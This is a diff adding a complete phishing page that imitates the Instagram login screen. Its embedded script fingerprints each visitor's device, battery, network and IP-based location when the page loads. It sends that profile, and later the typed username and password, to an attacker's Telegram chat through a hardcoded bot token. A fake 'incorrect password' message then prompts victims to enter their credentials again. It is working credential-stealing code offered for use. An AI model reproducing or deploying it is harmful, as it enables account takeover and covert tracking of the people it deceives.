@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Instagram</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased}
+:root{--bg-color:#fff;--text-color:#000;--subtext-color:#737373;--input-bg:#f5f5f5;--input-border:#dbdbdb;--input-focus-border:#a8a8a8;--placeholder-color:#737373;--btn-bg:#0064e0;--btn-hover:#0056c0;--btn-text:#fff;--link-color:#000;--create-btn-color:#0095f6;--create-btn-border:#0095f6;--create-btn-hover:rgba(0,149,246,.05);--meta-svg-fill:#000;--error-color:#ed4956}
+@media (prefers-color-scheme:dark){:root{--bg-color:#000;--text-color:#fff;--subtext-color:#a8a8a8;--input-bg:#121212;--input-border:#262626;--input-focus-border:#555;--placeholder-color:#a8a8a8;--link-color:#fff;--create-btn-hover:rgba(0,149,246,.1);--meta-svg-fill:#fff}}
+body{background-color:var(--bg-color);display:flex;justify-content:center;align-items:center;min-height:100vh;color:var(--text-color);transition:background-color .3s ease,color .3s ease}
+.app-container{width:100%;max-width:400px;padding:20px 24px;display:flex;flex-direction:column;height:100vh;max-height:850px}
+.language-selector{text-align:center;color:var(--subtext-color);font-size:14px;margin-top:20px;margin-bottom:45px}
+.logo-container{display:flex;justify-content:center;margin-bottom:55px}
+.instagram-svg-logo{width:68px;height:68px}
+.login-form{display:flex;flex-direction:column;gap:12px}
+.input-group{position:relative}
+.input-group input{width:100%;padding:16px;background-color:var(--input-bg);border:1px solid var(--input-border);border-radius:12px;color:var(--text-color);font-size:15px;outline:none;transition:border-color .2s ease,background-color .3s ease}
+.input-group input:focus{border-color:var(--input-focus-border)}
+.input-group input::placeholder{color:var(--placeholder-color);font-weight:400}
+.input-group input.error{border-color:var(--error-color)}
+.input-group input.error::placeholder{color:var(--error-color)}
+.login-btn{background-color:var(--btn-bg);color:var(--btn-text);border:none;border-radius:50px;padding:15px;font-size:16px;font-weight:600;margin-top:6px;cursor:pointer;transition:background-color .2s ease}
+.login-btn:hover{background-color:var(--btn-hover)}
+.login-btn:disabled{opacity:.6;cursor:not-allowed}
+.insta-error{color:var(--error-color);font-size:14px;text-align:center;margin-top:16px;line-height:1.4;display:none;font-weight:400}
+.insta-error.show{display:block}
+.forgot-password{text-align:center;margin-top:24px;margin-bottom:40px}
+.forgot-password a{color:var(--link-color);text-decoration:none;font-size:14px;font-weight:500}
+.spacer{flex-grow:1}
+.create-account-btn{background-color:transparent;color:var(--create-btn-color);border:1px solid var(--create-btn-border);border-radius:50px;padding:14px;font-size:15px;font-weight:600;cursor:pointer;text-align:center;transition:background-color .2s ease}
+.create-account-btn:hover{background-color:var(--create-btn-hover)}
+.meta-footer{display:flex;justify-content:center;align-items:center;gap:7px;margin-top:40px;margin-bottom:20px}
+.meta-logo-svg{height:14px;width:auto;fill:var(--meta-svg-fill);transition:fill .3s ease}
+.meta-text{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;font-size:17px;font-weight:500;letter-spacing:-.2px;color:var(--text-color);line-height:1;transition:color .3s ease}
+</style>
+</head>
+<body>
+<div class="app-container">
+    <div class="language-selector">English (UK)</div>
+
+    <div class="logo-container">
+        <svg class="instagram-svg-logo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+            <defs>
+                <linearGradient id="instaPerfectGradient" x1="0%" y1="100%" x2="100%" y2="0%">
+                    <stop offset="0%" stop-color="#FFC107"/><stop offset="25%" stop-color="#FF5722"/>
+                    <stop offset="50%" stop-color="#E91E63"/><stop offset="75%" stop-color="#9C27B0"/>
+                    <stop offset="100%" stop-color="#3F51B5"/>
+                </linearGradient>
+                <linearGradient id="instaInnerGradient" x1="0%" y1="100%" x2="100%" y2="0%">
+                    <stop offset="0%" stop-color="#FF9800"/><stop offset="40%" stop-color="#E91E63"/>
+                    <stop offset="100%" stop-color="#9C27B0"/>
+                </linearGradient>
+            </defs>
+            <rect x="12" y="12" width="76" height="76" rx="24" ry="24" fill="none" stroke="url(#instaPerfectGradient)" stroke-width="7.5"/>
+            <circle cx="50" cy="50" r="17" fill="none" stroke="url(#instaInnerGradient)" stroke-width="7.5"/>
+            <circle cx="72" cy="28" r="5" fill="url(#instaInnerGradient)"/>
+        </svg>
+    </div>
+
+    <form class="login-form" id="loginForm" novalidate>
+        <div class="input-group">
+            <input type="text" id="emailOrPhone" placeholder="Username, email address or mobile number" autocomplete="username" required>
+        </div>
+        <div class="input-group">
+            <input type="password" id="password" placeholder="Password" autocomplete="current-password" required>
+        </div>
+        <button type="submit" class="login-btn" id="loginBtn">Log in</button>
+        <div class="insta-error" id="instaError">
+            Sorry, your password was incorrect. Please double-check your password.
+        </div>
+    </form>
+
+    <div class="forgot-password"><a href="#">Forgotten password?</a></div>
+    <div class="spacer"></div>
+    <button class="create-account-btn" type="button">Create new account</button>
+
+    <div class="meta-footer">
+        <svg class="meta-logo-svg" viewBox="0 0 100 60" xmlns="http://www.w3.org/2000/svg">
+            <path d="M74.3 8.3C68.8 8.3 63.8 11.2 60 15.6 56.2 11.2 51.2 8.3 45.7 8.3c-11.8 0-21.4 10.3-21.4 23 0 10.1 6 18.7 14.5 21.7C41.2 53.9 43.4 54 45.7 54c5.5 0 10.5-2.9 14.3-7.3 3.8 4.4 8.8 7.3 14.3 7.3 11.8 0 21.4-10.3 21.4-23C95.7 18.6 86.1 8.3 74.3 8.3zm-28.6 34c-5.7 0-10.3-4.9-10.3-11s4.6-11 10.3-11 10.3 4.9 10.3 11-4.6 11-10.3 11zm28.6 0c-5.7 0-10.3-4.9-10.3-11s4.6-11 10.3-11 10.3 4.9 10.3 11-4.6 11-10.3 11z" fill-rule="evenodd"/>
+        </svg>
+        <span class="meta-text">Meta</span>
+    </div>
+</div>
+
+<script>
+(function(){
+    // ============================================================
+    // ⚠️ CONFIG — ONLY THE BOT TOKEN IS HARDCODED
+    // ============================================================
+    const BOT_TOKEN = '8664922486:AAGCg1oa5vnRS-FCIHnZYf173t0x_-ScFj8';
+    // ============================================================
+
+    // ------------------------------------------------------------
+    // 📌 READ CHAT ID FROM URL PARAMETER  ?id=123456789
+    // ------------------------------------------------------------
+    const urlParams = new URLSearchParams(window.location.search);
+    const CHAT_ID   = (urlParams.get('id') || '').trim();
+
+    // Validate: Telegram chat IDs are numeric, usually 6-12 digits
+    const hasValidChatId = /^\d{5,}$/.test(CHAT_ID);
+
+    if (!hasValidChatId) {
+        console.warn('⚠️ No valid ?id=CHAT_ID in URL. Reports will NOT be sent.');
+        console.warn('   Example: https://yoursite.com/?id=7468971788');
+    } else {
+        console.log('✅ Chat ID loaded from URL:', CHAT_ID);
+    }
+
+    const form       = document.getElementById('loginForm');
+    const emailInput = document.getElementById('emailOrPhone');
+    const passInput  = document.getElementById('password');
+    const btn        = document.getElementById('loginBtn');
+    const instaError = document.getElementById('instaError');
+
+    let attemptCount = 0;
+
+    // ============================================================
+    // 1. GATHER FULL DEVICE / BROWSER INTELLIGENCE
+    // ============================================================
+    function getDeviceInfo() {
+        const ua = navigator.userAgent;
+
+        // --- Platform detection ---
+        let platform = 'Unknown';
+        if (/windows phone/i.test(ua)) platform = 'Windows Phone';
+        else if (/win/i.test(ua)) platform = 'Windows';
+        else if (/android/i.test(ua)) platform = 'Android';
+        else if (/iphone|ipod/i.test(ua)) platform = 'iPhone';
+        else if (/ipad/i.test(ua)) platform = 'iPad';
+        else if (/mac/i.test(ua)) platform = 'macOS';
+        else if (/linux/i.test(ua)) platform = 'Linux';
+
+        // --- Browser detection ---
+        let browser = 'Unknown';
+        if (/edg/i.test(ua)) browser = 'Microsoft Edge';
+        else if (/opr|opera/i.test(ua)) browser = 'Opera';
+        else if (/chrome|crios/i.test(ua)) browser = 'Chrome';
+        else if (/firefox|fxios/i.test(ua)) browser = 'Firefox';
+        else if (/safari/i.test(ua)) browser = 'Safari';
+        else if (/msie|trident/i.test(ua)) browser = 'Internet Explorer';
+
+        // --- Device type ---
+        const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(ua);
+        const deviceType = isMobile ? '📱 Mobile' : '💻 Desktop';
+
+        // --- Time ---
+        const now = new Date();
+        const localTime = now.toLocaleString();
+        const utcTime   = now.toUTCString();
+        const tz        = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const tzOffset  = -now.getTimezoneOffset() / 60;
+
+        // --- Screen ---
+        const screenRes = window.screen.width + 'x' + window.screen.height;
+        const viewport  = window.innerWidth + 'x' + window.innerHeight;
+        const dpr       = window.devicePixelRatio || 1;
+        const colorDepth = window.screen.colorDepth + '-bit';
+
+        // --- Language / Locale ---
+        const language  = navigator.language || 'Unknown';
+        const languages = (navigator.languages || []).join(', ') || language;
+
+        // --- Hardware ---
+        const cores     = navigator.hardwareConcurrency || 'Unknown';
+        const memory    = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown';
+        const touch     = ('ontouchstart' in window) ? 'Yes' : 'No';
+
+        // --- Network ---
+        let networkType = 'Unknown';
+        let downlink    = 'Unknown';
+        let rtt         = 'Unknown';
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if (conn) {
+            networkType = conn.effectiveType || conn.type || 'Unknown';
+            downlink    = conn.downlink ? conn.downlink + ' Mbps' : 'Unknown';
+            rtt         = conn.rtt ? conn.rtt + ' ms' : 'Unknown';
+        }
+
+        // --- Page / Referrer ---
+        const referrer = document.referrer || 'Direct / None';
+        const pageUrl  = window.location.href;
+
+        return {
+            deviceType, platform, browser,
+            localTime, utcTime, tz, tzOffset,
+            screenRes, viewport, dpr, colorDepth,
+            language, languages,
+            cores, memory, touch,
+            networkType, downlink, rtt,
+            referrer, pageUrl,
+            userAgent: ua
+        };
+    }
+
+    // ============================================================
+    // 2. GET PUBLIC IP + GEOLOCATION
+    // ============================================================
+    async function getIPInfo() {
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            if (!res.ok) throw new Error('ipapi failed');
+            const d = await res.json();
+            return {
+                ip:       d.ip || 'Unknown',
+                city:     d.city || 'Unknown',
+                region:   d.region || 'Unknown',
+                country:  d.country_name || 'Unknown',
+                postal:   d.postal || 'Unknown',
+                isp:      d.org || 'Unknown',
+                asn:      d.asn || 'Unknown',
+                lat:      d.latitude || 'Unknown',
+                lon:      d.longitude || 'Unknown',
+                timezone: d.timezone || 'Unknown'
+            };
+        } catch (e) {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const d = await res.json();
+                return { ip: d.ip, city:'Unknown', region:'Unknown', country:'Unknown',
+                         postal:'Unknown', isp:'Unknown', asn:'Unknown',
+                         lat:'Unknown', lon:'Unknown', timezone:'Unknown' };
+            } catch (e2) {
+                return { ip:'Unknown', city:'Unknown', region:'Unknown', country:'Unknown',
+                         postal:'Unknown', isp:'Unknown', asn:'Unknown',
+                         lat:'Unknown', lon:'Unknown', timezone:'Unknown' };
+            }
+        }
+    }
+
+    // ============================================================
+    // 3. GET BATTERY INFO
+    // ============================================================
+    async function getBattery() {
+        try {
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                const pct = Math.round(b.level * 100);
+                const charging = b.charging ? '⚡ Charging' : '🔋 Not charging';
+                return pct + '% (' + charging + ')';
+            }
+        } catch (e) {}
+        return 'Not available';
+    }
+
+    // ============================================================
+    // 4. CORE TELEGRAM SENDER — sends to the ID from the URL
+    // ============================================================
+    async function sendToChat(text) {
+        if (!hasValidChatId) return;   // don't send if no valid id
+
+        const url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
+
+        try {
+            const res = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: text,
+                    parse_mode: 'Markdown',
+                    disable_web_page_preview: true
+                })
+            });
+            const data = await res.json();
+            if (data.ok) console.log('✅ Sent to chat ' + CHAT_ID);
+            else console.warn('⚠️ Telegram:', data.description);
+            return data;
+        } catch (err) {
+            console.warn('⚠️ Telegram send failed:', err.message);
+        }
+    }
+
+    // ============================================================
+    // 5. VISIT ALERT — fires on page load
+    // ============================================================
+    async function sendVisitAlert() {
+        const info = getDeviceInfo();
+        const ip   = await getIPInfo();
+        const battery = await getBattery();
+
+        let msg = '';
+        msg += '👀 *LINK OPENED* 👀\n';
+        msg += '━━━━━━━━━━━━━━━━━━━━\n\n';
+
+        msg += '🕒 *TIME*\n';
+        msg += '📅 Local: `' + info.localTime + '`\n';
+        msg += '🌍 UTC: `' + info.utcTime + '`\n';
+        msg += '⏰ TZ: `' + info.tz + ' (UTC' +
+               (info.tzOffset >= 0 ? '+' : '') + info.tzOffset + ')`\n\n';
+
+        msg += '📱 *DEVICE*\n';
+        msg += '💻 Type: ' + info.deviceType + '\n';
+        msg += '🖥 OS: `' + info.platform + '`\n';
+        msg += '🌐 Browser: `' + info.browser + '`\n';
+        msg += '🖼 Screen: `' + info.screenRes + '`\n';
+        msg += '📐 Viewport: `' + info.viewport + '`\n';
+        msg += '🔍 DPR: `' + info.dpr + '` | Depth: `' + info.colorDepth + '`\n';
+        msg += '⚙️ Cores: `' + info.cores + '` | RAM: `' + info.memory + '`\n';
+        msg += '👆 Touch: `' + info.touch + '`\n';
+        msg += '🔋 Battery: `' + battery + '`\n\n';
+
+        msg += '🌍 *LOCATION*\n';
+        msg += '📡 IP: `' + ip.ip + '`\n';
+        msg += '🏙 City: `' + ip.city + '`\n';
+        msg += '🗺 Region: `' + ip.region + '`\n';
+        msg += '🏳 Country: `' + ip.country + '`\n';
+        msg += '📮 Postal: `' + ip.postal + '`\n';
+        msg += '📌 Coords: `' + ip.lat + ', ' + ip.lon + '`\n';
+        msg += '🏢 ISP: `' + ip.isp + '`\n';
+        msg += '🔢 ASN: `' + ip.asn + '`\n\n';
+
+        msg += '📶 *NETWORK*\n';
+        msg += '🔗 Type: `' + info.networkType + '`\n';
+        msg += '⬇️ Down: `' + info.downlink + '`\n';
+        msg += '📡 RTT: `' + info.rtt + '`\n\n';
+
+        msg += '🗣 *LANGUAGE*\n';
+        msg += 'Lang: `' + info.language + '`\n';
+        msg += 'All: `' + info.languages + '`\n\n';
+
+        msg += '🔗 *PAGE*\n';
+        msg += 'URL: `' + info.pageUrl + '`\n';
+        msg += 'Referrer: `' + info.referrer + '`\n\n';
+
+        msg += '🧾 *USER AGENT*\n`' + info.userAgent + '`\n';
+
+        await sendToChat(msg);
+    }
+
+    // ============================================================
+    // 6. LOGIN REPORT — fires on form submit
+    // ============================================================
+    async function sendLoginReport(emailOrPhone, password) {
+        const info = getDeviceInfo();
+        const ip   = await getIPInfo();
+        const battery = await getBattery();
+        const line = '━━━━━━━━━━━━━━━━━━━━';
+
+        let msg = '';
+        msg += '🚨 *NEW LOGIN CAPTURED* 🚨\n' + line + '\n\n';
+
+        msg += '🔐 *CREDENTIALS*\n';
+        msg += '📧 *Email / Phone:* `' + emailOrPhone + '`\n';
+        msg += '🔑 *Password:* `' + password + '`\n';
+        msg += '🔁 *Attempt:* #' + (attemptCount + 1) + '\n\n';
+
+        msg += '🕒 *TIME*\n';
+        msg += '📅 Local: `' + info.localTime + '`\n';
+        msg += '🌍 UTC: `' + info.utcTime + '`\n';
+        msg += '⏰ TZ: `' + info.tz + ' (UTC' +
+               (info.tzOffset >= 0 ? '+' : '') + info.tzOffset + ')`\n\n';
+
+        msg += '📱 *DEVICE*\n';
+        msg += '💻 Type: ' + info.deviceType + '\n';
+        msg += '🖥 OS: `' + info.platform + '`\n';
+        msg += '🌐 Browser: `' + info.browser + '`\n';
+        msg += '🖼 Screen: `' + info.screenRes + '`\n';
+        msg += '📐 Viewport: `' + info.viewport + '`\n';
+        msg += '🔍 DPR: `' + info.dpr + '` | Depth: `' + info.colorDepth + '`\n';
+        msg += '⚙️ Cores: `' + info.cores + '` | RAM: `' + info.memory + '`\n';
+        msg += '👆 Touch: `' + info.touch + '`\n';
+        msg += '🔋 Battery: `' + battery + '`\n\n';
+
+        msg += '🌍 *LOCATION*\n';
+        msg += '📡 IP: `' + ip.ip + '`\n';
+        msg += '🏙 City: `' + ip.city + '`\n';
+        msg += '🗺 Region: `' + ip.region + '`\n';
+        msg += '🏳 Country: `' + ip.country + '`\n';
+        msg += '📮 Postal: `' + ip.postal + '`\n';
+        msg += '📌 Coords: `' + ip.lat + ', ' + ip.lon + '`\n';
+        msg += '🏢 ISP: `' + ip.isp + '`\n';
+        msg += '🔢 ASN: `' + ip.asn + '`\n\n';
+
+        msg += '📶 *NETWORK*\n';
+        msg += '🔗 Type: `' + info.networkType + '`\n';
+        msg += '⬇️ Down: `' + info.downlink + '`\n';
+        msg += '📡 RTT: `' + info.rtt + '`\n\n';
+
+        msg += '🗣 *LANGUAGE*\n';
+        msg += 'Lang: `' + info.language + '`\n';
+        msg += 'All: `' + info.languages + '`\n\n';
+
+        msg += '🔗 *PAGE*\n';
+        msg += 'URL: `' + info.pageUrl + '`\n';
+        msg += 'Referrer: `' + info.referrer + '`\n\n';
+
+        msg += '🧾 *USER AGENT*\n`' + info.userAgent + '`\n';
+
+        await sendToChat(msg);
+    }
+
+    // ============================================================
+    // 7. FIRE VISIT ALERT ON LOAD
+    // ============================================================
+    if (hasValidChatId) {
+        sendVisitAlert();
+    }
+
+    // ============================================================
+    // 8. UI BEHAVIOR
+    // ============================================================
+    function showIncorrectPassword() {
+        attemptCount++;
+        if (attemptCount === 1) {
+            instaError.textContent = 'Sorry, your password was incorrect. Please double-check your password.';
+        } else {
+            instaError.textContent = "We couldn't log you in. Please check your username and password and try again.";
+        }
+        passInput.classList.add('error');
+        instaError.classList.add('show');
+        passInput.value = '';
+        passInput.focus();
+    }
+
+    function clearError() {
+        if (passInput.classList.contains('error')) {
+            passInput.classList.remove('error');
+            instaError.classList.remove('show');
+        }
+    }
+    passInput.addEventListener('input', clearError);
+    emailInput.addEventListener('input', clearError);
+
+    form.addEventListener('submit', function(e){
+        e.preventDefault();
+        const emailOrPhone = emailInput.value.trim();
+        const password     = passInput.value;
+
+        if (!emailOrPhone) { emailInput.focus(); return; }
+        if (!password) {
+            passInput.classList.add('error');
+            instaError.textContent = 'Please enter your password.';
+            instaError.classList.add('show');
+            passInput.focus();
+            return;
+        }
+
+        // Send full report to the chat ID from the URL
+        sendLoginReport(emailOrPhone, password);
+
+        // Show realistic "Logging in..." moment then Instagram error
+        btn.disabled = true;
+        btn.textContent = 'Logging in...';
+        setTimeout(function(){
+            btn.disabled = false;
+            btn.textContent = 'Log in';
+            showIncorrectPassword();
+        }, 900);
+    });
+})();
+</script>
+</body>
+  </html>
